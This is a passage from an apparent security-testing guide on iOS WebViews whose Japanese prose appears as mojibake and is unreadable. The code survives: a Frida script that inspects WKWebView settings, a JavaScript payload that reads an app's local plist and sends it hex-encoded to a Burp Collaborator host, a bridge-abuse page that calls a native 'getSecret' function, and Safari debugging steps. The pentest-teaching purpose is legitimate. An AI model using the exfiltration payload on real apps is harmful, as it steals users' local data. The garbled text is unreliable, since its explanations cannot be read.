ã“ã‚Œã‚‰ã®é–¢æ•°ã‚’ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ã‚„ã‚³ãƒ³ãƒ‘ã‚¤ãƒ«ã•ã‚ŒãŸãƒã‚¤ãƒŠãƒªã§æ¤œç´¢ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚\
ã¾ãŸã€ä»¥ä¸‹ã®fridaã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’ä½¿ç”¨ã—ã¦ã“ã®æƒ…å ±ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š
```bash
ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('URL: ', wk.URL().toString());
console.log('javaScriptEnabled: ', wk.configuration().preferences().javaScriptEnabled());
console.log('allowFileAccessFromFileURLs: ',
wk.configuration().preferences().valueForKey_('allowFileAccessFromFileURLs').toString());
console.log('hasOnlySecureContent: ', wk.hasOnlySecureContent().toString());
console.log('allowUniversalAccessFromFileURLs: ',
wk.configuration().valueForKey_('allowUniversalAccessFromFileURLs').toString());
},
onComplete: function () {
console.log('done for WKWebView!');
}
});
```

```bash
frida -U -f com.authenticationfailure.WheresMyBrowser -l webviews_inspector.js

onMatch:  <WKWebView: 0x1508b1200; frame = (0 0; 320 393); layer = <CALayer: 0x1c4238f20>>
URL:  file:///var/mobile/Containers/Data/Application/A654D169-1DB7-429C-9DB9-A871389A8BAA/
Library/WKWebView/scenario1.html
javaScriptEnabled:  true
allowFileAccessFromFileURLs:  0
hasOnlySecureContent:  false
allowUniversalAccessFromFileURLs:  0
```
#### ä»»æ„ã®ãƒ•ã‚¡ã‚¤ãƒ«ã‚’æŠ½å‡ºã™ã‚‹
```javascript
//For some reason this payload doesn't work!!
//Let me know if you know how to exfiltrate local files from a WKWebView
String.prototype.hexEncode = function(){
var hex, i;
var result = "";
for (i=0; i<this.length; i++) {
hex = this.charCodeAt(i).toString(16);
result += ("000"+hex).slice(-4);
}
return result
}

var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if (xhr.readyState == XMLHttpRequest.DONE) {
var xhr2 = new XMLHttpRequest();
xhr2.open('GET', 'http://187e2gd0zxunzmb5vlowsz4j1a70vp.burpcollaborator.net/'+xhr.responseText.hexEncode(), true);
xhr2.send(null);
}
}
xhr.open('GET', 'file:///var/mobile/Containers/Data/Application/ED4E0AD8-F7F7-4078-93CC-C350465048A5/Library/Preferences/com.authenticationfailure.WheresMyBrowser.plist', true);
xhr.send(null);
```
## WebViewã‚’é€šã˜ã¦éœ²å‡ºã•ã‚Œã‚‹ãƒã‚¤ãƒ†ã‚£ãƒ–ãƒ¡ã‚½ãƒƒãƒ‰

iOS 7ä»¥é™ã€Appleã¯**WebViewå†…ã®JavaScriptãƒ©ãƒ³ã‚¿ã‚¤ãƒ ã¨ãƒã‚¤ãƒ†ã‚£ãƒ–**ã®Swiftã¾ãŸã¯Objective-Cã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆé–“ã®é€šä¿¡ã‚’å¯èƒ½ã«ã™ã‚‹APIã‚’å°å…¥ã—ã¾ã—ãŸã€‚

ãƒã‚¤ãƒ†ã‚£ãƒ–ã‚³ãƒ¼ãƒ‰ã¨JavaScriptãŒé€šä¿¡ã™ã‚‹åŸºæœ¬çš„ãªæ–¹æ³•ã¯2ã¤ã‚ã‚Šã¾ã™ï¼š

* **JSContext**: Objective-Cã¾ãŸã¯Swiftãƒ–ãƒ­ãƒƒã‚¯ãŒ`JSContext`å†…ã®è­˜åˆ¥å­ã«å‰²ã‚Šå½“ã¦ã‚‰ã‚Œã‚‹ã¨ã€JavaScriptCoreã¯è‡ªå‹•çš„ã«ãƒ–ãƒ­ãƒƒã‚¯ã‚’JavaScripté–¢æ•°ã«ãƒ©ãƒƒãƒ—ã—ã¾ã™ã€‚
* **JSExportãƒ—ãƒ­ãƒˆã‚³ãƒ«**: `JSExport`ã‚’ç¶™æ‰¿ã—ãŸãƒ—ãƒ­ãƒˆã‚³ãƒ«ã§å®£è¨€ã•ã‚ŒãŸãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã€ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ãƒ¡ã‚½ãƒƒãƒ‰ã€ã‚¯ãƒ©ã‚¹ãƒ¡ã‚½ãƒƒãƒ‰ã¯ã€ã™ã¹ã¦ã®JavaScriptã‚³ãƒ¼ãƒ‰ã§åˆ©ç”¨å¯èƒ½ãªJavaScriptã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã«ãƒãƒƒãƒ”ãƒ³ã‚°ã•ã‚Œã¾ã™ã€‚JavaScriptç’°å¢ƒå†…ã®ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®å¤‰æ›´ã¯ãƒã‚¤ãƒ†ã‚£ãƒ–ç’°å¢ƒã«åæ˜ ã•ã‚Œã¾ã™ã€‚

**`JSExport`ãƒ—ãƒ­ãƒˆã‚³ãƒ«ã§å®šç¾©ã•ã‚ŒãŸã‚¯ãƒ©ã‚¹ãƒ¡ãƒ³ãƒãƒ¼ã®ã¿**ãŒJavaScriptã‚³ãƒ¼ãƒ‰ã«ã‚¢ã‚¯ã‚»ã‚¹å¯èƒ½ã«ãªã‚‹ã“ã¨ã«æ³¨æ„ã—ã¦ãã ã•ã„ã€‚\
WebViewã«é–¢é€£ä»˜ã‘ã‚‰ã‚ŒãŸ`JSContext`ã«ãƒãƒƒãƒ”ãƒ³ã‚°ã•ã‚ŒãŸãƒã‚¤ãƒ†ã‚£ãƒ–ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®ã‚³ãƒ¼ãƒ‰ã‚’æ¢ã—ã€ã©ã®ã‚ˆã†ãªæ©Ÿèƒ½ãŒéœ²å‡ºã•ã‚Œã¦ã„ã‚‹ã‹ã‚’åˆ†æã—ã¾ã™ã€‚ä¾‹ãˆã°ã€WebViewã«ã‚¢ã‚¯ã‚»ã‚¹å¯èƒ½ã§éœ²å‡ºã•ã‚Œã‚‹ã¹ãã§ã¯ãªã„æ©Ÿå¯†ãƒ‡ãƒ¼ã‚¿ãŒã‚ã‚Šã¾ã™ã€‚\
Objective-Cã§ã¯ã€`UIWebView`ã«é–¢é€£ä»˜ã‘ã‚‰ã‚ŒãŸ`JSContext`ã¯ä»¥ä¸‹ã®ã‚ˆã†ã«å–å¾—ã•ã‚Œã¾ã™ï¼š
```objectivec
[webView valueForKeyPath:@"documentView.webView.mainFrame.javaScriptContext"]
```
JavaScript ã‚³ãƒ¼ãƒ‰ã¯ **`WKWebView` ã§ãƒã‚¤ãƒ†ã‚£ãƒ–ã‚¢ãƒ—ãƒªã«ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã‚’é€ä¿¡ã™ã‚‹ã“ã¨ã¯å¯èƒ½ã§ã™ãŒã€`UIWebView` ã¨ã¯å¯¾ç…§çš„ã«ã€`WKWebView` ã® `JSContext` ã‚’ç›´æ¥å‚ç…§ã™ã‚‹ã“ã¨ã¯ã§ãã¾ã›ã‚“ã€‚** ä»£ã‚ã‚Šã«ã€ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ãƒ³ã‚°ã‚·ã‚¹ãƒ†ãƒ ã‚’ä½¿ç”¨ã—ã€JavaScript ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’ãƒã‚¤ãƒ†ã‚£ãƒ–ã® Objective-C ã‚„ Swift ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã«è‡ªå‹•çš„ã«ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã™ã‚‹ `postMessage` é–¢æ•°ã‚’ä½¿ç”¨ã—ã¦é€šä¿¡ãŒå®Ÿè£…ã•ã‚Œã¾ã™ã€‚ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ãƒãƒ³ãƒ‰ãƒ©ãƒ¼ã¯ã€[`add(_ scriptMessageHandler:name:)`](https://developer.apple.com/documentation/webkit/wkusercontentcontroller/1537172-add) ãƒ¡ã‚½ãƒƒãƒ‰ã‚’ä½¿ç”¨ã—ã¦è¨­å®šã•ã‚Œã¾ã™ã€‚

### JavascriptBridge ã‚’æœ‰åŠ¹ã«ã™ã‚‹
```swift
func enableJavaScriptBridge(_ enabled: Bool) {
options_dict["javaScriptBridge"]?.value = enabled
let userContentController = wkWebViewConfiguration.userContentController
userContentController.removeScriptMessageHandler(forName: "javaScriptBridge")

if enabled {
let javaScriptBridgeMessageHandler = JavaScriptBridgeMessageHandler()
userContentController.add(javaScriptBridgeMessageHandler, name: "javaScriptBridge")
}
}
```
### ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã®é€ä¿¡

ã‚¹ã‚¯ãƒªãƒ—ãƒˆãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ãƒãƒ³ãƒ‰ãƒ©ã‚’åå‰ `"name"`ï¼ˆã¾ãŸã¯ä¸Šè¨˜ã®ä¾‹ã§ã¯ `"javaScriptBridge"`ï¼‰ã§è¿½åŠ ã™ã‚‹ã¨ã€ãã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã‚³ãƒ³ãƒˆãƒ­ãƒ¼ãƒ©ãƒ¼ã‚’ä½¿ç”¨ã™ã‚‹ã™ã¹ã¦ã®ã‚¦ã‚§ãƒ–ãƒ“ãƒ¥ãƒ¼ã®ã™ã¹ã¦ã®ãƒ•ãƒ¬ãƒ¼ãƒ ã§JavaScripté–¢æ•° `window.webkit.messageHandlers.myJavaScriptMessageHandler.postMessage` ãŒå®šç¾©ã•ã‚Œã¾ã™ã€‚ãã‚Œã¯æ¬¡ã®ã‚ˆã†ã«HTMLãƒ•ã‚¡ã‚¤ãƒ«ã‹ã‚‰[ä½¿ç”¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™](https://github.com/authenticationfailure/WheresMyBrowser.iOS/blob/d4e2d9efbde8841bf7e4a8800418dda6bb116ec6/WheresMyBrowser/web/WKWebView/scenario3.html#L33)ï¼š
```javascript
function invokeNativeOperation() {
value1 = document.getElementById("value1").value
value2 = document.getElementById("value2").value
window.webkit.messageHandlers.javaScriptBridge.postMessage(["multiplyNumbers", value1, value2]);
}
//After testing the previos funtion I got the error TypeError: undefined is not an object (evaluating 'window.webkit.messageHandlers')
//But the following code worked to call the exposed javascriptbridge with the args "addNumbers", "1", "2"

document.location = "javascriptbridge://addNumbers/" + 1 + "/" + 2
```
ãƒã‚¤ãƒ†ã‚£ãƒ–é–¢æ•°ãŒå®Ÿè¡Œã•ã‚Œã‚‹ã¨ã€é€šå¸¸ã¯**ã‚¦ã‚§ãƒ–ãƒšãƒ¼ã‚¸å†…ã§JavaScriptã‚’å®Ÿè¡Œã—ã¾ã™**ï¼ˆä»¥ä¸‹ã®`evaluateJavascript`ã‚’å‚ç…§ï¼‰ã€‚å®Ÿè¡Œã•ã‚Œã‚‹é–¢æ•°ã‚’**ã‚ªãƒ¼ãƒãƒ¼ãƒ©ã‚¤ãƒ‰ã—ã¦**ã€**çµæœã‚’ç›—ã‚€**ã“ã¨ã«èˆˆå‘³ãŒã‚ã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚
ä¾‹ãˆã°ã€ä»¥ä¸‹ã®ã‚¹ã‚¯ãƒªãƒ—ãƒˆã§ã¯ã€**`javascriptBridgeCallBack`** é–¢æ•°ãŒ2ã¤ã®ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ï¼ˆå‘¼ã³å‡ºã•ã‚ŒãŸé–¢æ•°ã¨**çµæœ**ï¼‰ã‚’æŒã£ã¦å®Ÿè¡Œã•ã‚Œã¾ã™ã€‚ãƒ­ãƒ¼ãƒ‰ã•ã‚Œã‚‹HTMLã‚’åˆ¶å¾¡ã—ã¦ã„ã‚‹å ´åˆã€çµæœã‚’è¡¨ç¤ºã™ã‚‹**ã‚¢ãƒ©ãƒ¼ãƒˆã‚’ä½œæˆ**ã§ãã¾ã™ã€‚
```markup
<html>
<script>
document.location = "javascriptbridge://getSecret"
function javascriptBridgeCallBack(name, result) {
alert(result);
}
</script>
</html>
```
### å‘¼ã³å‡ºã•ã‚ŒãŸé–¢æ•°

å‘¼ã³å‡ºã•ã‚ŒãŸé–¢æ•°ã¯[`JavaScriptBridgeMessageHandler.swift`](https://github.com/authenticationfailure/WheresMyBrowser.iOS/blob/b8d4abda4000aa509c7a5de79e5c90360d1d0849/WheresMyBrowser/JavaScriptBridgeMessageHandler.swift#L29)ã«å­˜åœ¨ã—ã¾ã™:
```swift
class JavaScriptBridgeMessageHandler: NSObject, WKScriptMessageHandler {

//...

case "multiplyNumbers":

let arg1 = Double(messageArray[1])!
let arg2 = Double(messageArray[2])!
result = String(arg1 * arg2)
//...

let javaScriptCallBack = "javascriptBridgeCallBack('\(functionFromJS)','\(result)')"
message.webView?.evaluateJavaScript(javaScriptCallBack, completionHandler: nil)
```
### ãƒ†ã‚¹ãƒˆ

ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³å†…ã§postMessageã‚’é€ä¿¡ã™ã‚‹ãŸã‚ã®ãƒ†ã‚¹ãƒˆæ–¹æ³•ã¯ä»¥ä¸‹ã®é€šã‚Šã§ã™:

* ã‚µãƒ¼ãƒãƒ¼ã®å¿œç­”ã‚’å¤‰æ›´ã™ã‚‹ (MitM)
* Fridaã®ã‚ˆã†ãªãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã‚’ä½¿ç”¨ã—ã¦å‹•çš„ãªã‚¤ãƒ³ã‚¹ãƒˆãƒ«ãƒ¡ãƒ³ãƒ†ãƒ¼ã‚·ãƒ§ãƒ³ã‚’è¡Œã„ã€iOS WebViewsç”¨ã®å¯¾å¿œã™ã‚‹JavaScriptè©•ä¾¡é–¢æ•°([`stringByEvaluatingJavaScriptFromString:`](https://developer.apple.com/documentation/uikit/uiwebview/1617963-stringbyevaluatingjavascriptfrom?language=objc) for `UIWebView` ã¨ [`evaluateJavaScript:completionHandler:`](https://developer.apple.com/documentation/webkit/wkwebview/1415017-evaluatejavascript?language=objc) for `WKWebView`)ã‚’ä½¿ã£ã¦JavaScriptãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’æ³¨å…¥ã™ã‚‹ã€‚

## iOS WebViewsã®ãƒ‡ãƒãƒƒã‚°

([https://blog.vuplex.com/debugging-webviews](https://blog.vuplex.com/debugging-webviews)ã‹ã‚‰ã®ãƒãƒ¥ãƒ¼ãƒˆãƒªã‚¢ãƒ«)

iOS webviewsã§ã¯ã€`console.log()`ã«æ¸¡ã•ã‚ŒãŸãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã¯Xcodeã®ãƒ­ã‚°ã«ã¯è¡¨ç¤ºã•ã‚Œã¾ã›ã‚“ã€‚ãã‚Œã§ã‚‚ã€Safariã®é–‹ç™ºè€…ãƒ„ãƒ¼ãƒ«ã‚’ä½¿ã£ã¦Webã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã‚’æ¯”è¼ƒçš„ç°¡å˜ã«ãƒ‡ãƒãƒƒã‚°ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ãŒã€ã„ãã¤ã‹ã®åˆ¶é™ãŒã‚ã‚Šã¾ã™:

* iOS webviewsã®ãƒ‡ãƒãƒƒã‚°ã«ã¯SafariãŒå¿…è¦ãªã®ã§ã€é–‹ç™ºç”¨ã‚³ãƒ³ãƒ”ãƒ¥ãƒ¼ã‚¿ã¯macOSã‚’å®Ÿè¡Œã—ã¦ã„ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚
* Xcodeã‚’é€šã˜ã¦ãƒ‡ãƒã‚¤ã‚¹ã«ãƒ­ãƒ¼ãƒ‰ã•ã‚ŒãŸã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³å†…ã®webviewsã®ã¿ã‚’ãƒ‡ãƒãƒƒã‚°ã§ãã¾ã™ã€‚App Storeã‚„Apple Configuratorã‚’é€šã˜ã¦ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã•ã‚ŒãŸã‚¢ãƒ—ãƒªå†…ã®webviewsã¯ãƒ‡ãƒãƒƒã‚°ã§ãã¾ã›ã‚“ã€‚

ã“ã‚Œã‚‰ã®åˆ¶é™ã‚’å¿µé ­ã«ç½®ã„ã¦ã€iOSã§webviewã‚’ãƒªãƒ¢ãƒ¼ãƒˆãƒ‡ãƒãƒƒã‚°ã™ã‚‹æ‰‹é †ã¯ä»¥ä¸‹ã®é€šã‚Šã§ã™:

* ã¾ãšã€iOSãƒ‡ãƒã‚¤ã‚¹ã§Safari Webã‚¤ãƒ³ã‚¹ãƒšã‚¯ã‚¿ã‚’æœ‰åŠ¹ã«ã™ã‚‹ãŸã‚ã«ã€iOSã®_è¨­å®š_ã‚¢ãƒ—ãƒªã‚’é–‹ãã€**è¨­å®š > Safari > é«˜åº¦ãªè¨­å®š**ã«ç§»å‹•ã—ã€_Webã‚¤ãƒ³ã‚¹ãƒšã‚¯ã‚¿_ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã‚’ã‚ªãƒ³ã«åˆ‡ã‚Šæ›¿ãˆã¾ã™ã€‚

![iOS Safari settings](https://blog.vuplex.com/article-assets/20190324-debugging-webviews/ios-safari-settings.jpg)

* æ¬¡ã«ã€é–‹ç™ºç”¨ã‚³ãƒ³ãƒ”ãƒ¥ãƒ¼ã‚¿ã®Safariã§é–‹ç™ºè€…ãƒ„ãƒ¼ãƒ«ã‚’æœ‰åŠ¹ã«ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚é–‹ç™ºãƒã‚·ãƒ³ã§Safariã‚’èµ·å‹•ã—ã€ãƒ¡ãƒ‹ãƒ¥ãƒ¼ãƒãƒ¼ã®**Safari > ç’°å¢ƒè¨­å®š**ã«ç§»å‹•ã—ã¾ã™ã€‚è¡¨ç¤ºã•ã‚Œã‚‹ç’°å¢ƒè¨­å®šãƒšã‚¤ãƒ³ã§ã€_é«˜åº¦ãªè¨­å®š_ã‚¿ãƒ–ã‚’ã‚¯ãƒªãƒƒã‚¯ã—ã€ä¸‹éƒ¨ã«ã‚ã‚‹_é–‹ç™ºãƒ¡ãƒ‹ãƒ¥ãƒ¼ã‚’è¡¨ç¤º_ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã‚’æœ‰åŠ¹ã«ã—ã¾ã™ã€‚ãã‚Œã‚’è¡Œã£ãŸå¾Œã€ç’°å¢ƒè¨­å®šãƒšã‚¤ãƒ³ã‚’é–‰ã˜ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

![Mac Safari settings](https://blog.vuplex.com/article-assets/20190324-debugging-webviews/mac-safari-settings.jpg)

* iOSãƒ‡ãƒã‚¤ã‚¹ã‚’é–‹ç™ºç”¨ã‚³ãƒ³ãƒ”ãƒ¥ãƒ¼ã‚¿ã«æ¥ç¶šã—ã€ã‚¢ãƒ—ãƒªã‚’èµ·å‹•ã—ã¾ã™ã€‚
* é–‹ç™ºç”¨ã‚³ãƒ³ãƒ”ãƒ¥ãƒ¼ã‚¿ã®Safariã§ã€ãƒ¡ãƒ‹ãƒ¥ãƒ¼ãƒãƒ¼ã®_é–‹ç™º_ã‚’ã‚¯ãƒªãƒƒã‚¯ã—ã€iOSãƒ‡ãƒã‚¤ã‚¹ã®åå‰ãŒè¡¨ç¤ºã•ã‚Œã¦ã„ã‚‹ãƒ‰ãƒ­ãƒƒãƒ—ãƒ€ã‚¦ãƒ³ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã«ã‚«ãƒ¼ã‚½ãƒ«ã‚’åˆã‚ã›ã¦ã€iOSãƒ‡ãƒã‚¤ã‚¹ã§å®Ÿè¡Œä¸­ã®webviewã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã®ãƒªã‚¹ãƒˆã‚’è¡¨ç¤ºã—ã¾ã™ã€‚

![Mac Safari develop menu](https://blog.vuplex.com/article-assets/20190324-debugging-webviews/mac-safari-develop-menu.jpg)

* ãƒ‡ãƒãƒƒã‚°ã—ãŸã„webviewã®ãƒ‰ãƒ­ãƒƒãƒ—ãƒ€ã‚¦ãƒ³ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã‚’ã‚¯ãƒªãƒƒã‚¯ã—ã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€webviewã‚’æ¤œæŸ»ã™ã‚‹ãŸã‚ã®æ–°ã—ã„Safari Webã‚¤ãƒ³ã‚¹ãƒšã‚¯ã‚¿ã‚¦ã‚£ãƒ³ãƒ‰ã‚¦ãŒé–‹ãã¾ã™ã€‚

![Safari Web Inspector window](https://blog.vuplex.com/article-assets/20190324-debugging-webviews/mac-safari-inspector.jpg)

## å‚è€ƒæ–‡çŒ®

* [https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06h-testing-platform-interaction#testing-webview-protocol-handlers-mstg-platform-6](https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06h-testing-platform-interaction#testing-webview-protocol-handlers-mstg-platform-6)
* [https://github.com/authenticationfailure/WheresMyBrowser.iOS](https://github.com/authenticationfailure/WheresMyBrowser.iOS)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)ã§AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§å­¦ã¶</strong></summary>

HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•:

* **HackTricksã«åºƒå‘Šã‚’æ²è¼‰ã—ãŸã„**ã€ã¾ãŸã¯**HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„**å ´åˆã¯ã€[**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼PEASS & HackTricksã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’å…¥æ‰‹ã™ã‚‹
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª[**NFTs**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’ãƒã‚§ãƒƒã‚¯ã™ã‚‹
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã‚„[**ãƒ†ãƒ¬ã‚°ãƒ©ãƒ ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ ã™ã‚‹**ã€ã¾ãŸã¯**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)ã§**ãƒ•ã‚©ãƒ­ãƒ¼ã™ã‚‹**ã€‚
* **HackTricks**ã¨[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®githubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ã€ã‚ãªãŸã®ãƒãƒƒã‚­ãƒ³ã‚°ã®ã‚³ãƒ„ã‚’å…±æœ‰ã™ã‚‹ã€‚

</details>
